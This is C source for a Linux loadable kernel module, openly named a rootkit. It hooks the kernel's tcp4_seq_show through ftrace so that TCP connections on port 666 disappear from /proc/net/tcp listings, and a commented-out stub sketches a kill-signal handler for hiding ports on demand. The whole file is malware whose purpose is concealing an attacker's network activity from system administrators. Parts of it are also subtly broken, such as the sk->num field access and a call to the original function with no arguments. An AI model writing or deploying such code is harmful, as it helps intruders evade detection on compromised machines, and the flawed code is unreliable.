#include<linux/module.h>
#include "libs/ftrace_helper.h"

//#define INVPORT 9
#define PORT 0x029A //666

static asmlinkage long (*orig_tcp4_seq_show)(const seq_file *seq, void *v);
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	struct sock *sk = v;
	if (sk != (struct sock *)0x1 && sk->num == PORT/*666*/)
		return 0;

	return (long)orig_tcp4_seq_show();
}

/* TO-DO: kill as a handler to hide ports dynamically
asmlinkage long (*orig_kill)(const pt_regs *regs);
asmlinkage int handler_kill(const pt_regs *regs)
{
	int sig=regs->si;
	switch(sig)
	{
	  case INVPORT:
	    // hide port
	}
} */

static struct ftrace_hook hooks[] = {HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),};
static int __init rootkit_init(void)
{
  fh_install_hooks(hooks, ARRAY_SIZE(hooks));
  return 0;
}

static void __exit rootkit_destroy(void)
{
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rootkit_init);
module_exit(rootkit_destroy);
